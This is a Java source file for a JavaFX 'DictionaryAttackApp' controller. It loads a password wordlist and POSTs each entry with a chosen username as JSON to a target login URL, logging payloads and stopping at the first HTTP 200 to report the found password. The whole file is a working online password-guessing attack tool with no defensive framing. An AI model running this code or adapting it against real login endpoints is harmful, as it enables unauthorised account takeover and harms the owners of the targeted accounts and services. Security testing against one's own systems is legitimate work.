package controller;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.ArrayList;
import java.util.Scanner;
import javafx.application.Application;
import javafx.stage.Stage;
import main.DictionaryAttackApp;

public class AttackController extends Application{
    @Override 
    public void start(Stage args0){
        DictionaryAttackApp dic = new DictionaryAttackApp();
        dic.dashboard(AttackController.this);
    }

    //start the engine
    public void start(String path, String username, String url, DictionaryAttackApp dic){

        ArrayList<String> passwords = getPasswords(path);

        //Creating HTTP client
        HttpClient client = HttpClient.newHttpClient();

        int obt = 1;
        for(String pass : passwords){
            String jsonPayload = String.format("{\"username\": \""+username+"\", \"password\": \""+pass+"\"}");
            dic.appendLogArea("PayLoad = "+ jsonPayload+"\n");
            dic.setpctLbl(""+(obt/passwords.size())*100);
            obt++;
            // System.out.println("Json Payload:"+jsonPayload);
            //building post request
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(url))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(jsonPayload))
                    .build();
            
            //catch a response
            int responseCode = 0;
            try{
                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
                // System.out.println(response.statusCode());
                responseCode = response.statusCode();
                dic.appendLogArea("Status Code = "+ responseCode +"\n");
                if (responseCode == 200) {
                    dic.setpassField("Pass: "+pass);
                    dic.appendLogArea("Password found = "+ pass +"\n");
                    break;
                }

            }
            catch(IOException | InterruptedException e){
                System.out.println("Network Error");
            }
            if(responseCode != 200){
                dic.setpassField("Password not found!");
                dic.appendLogArea("Password not found!\n");
            }
        }
    }
    //Storing passwords in an Arraylist
    public ArrayList<String> getPasswords(String path){
        ArrayList<String> passwords = new ArrayList<>();
        try{
            File txt = new File(path);
            Scanner sc = new Scanner(txt);

            while (sc.hasNextLine()) { 
                passwords.add(sc.nextLine());
            }
            sc.close();
        }
        catch(FileNotFoundException e){
            System.out.println("File not Found!");
        }
        return passwords;
    }
}
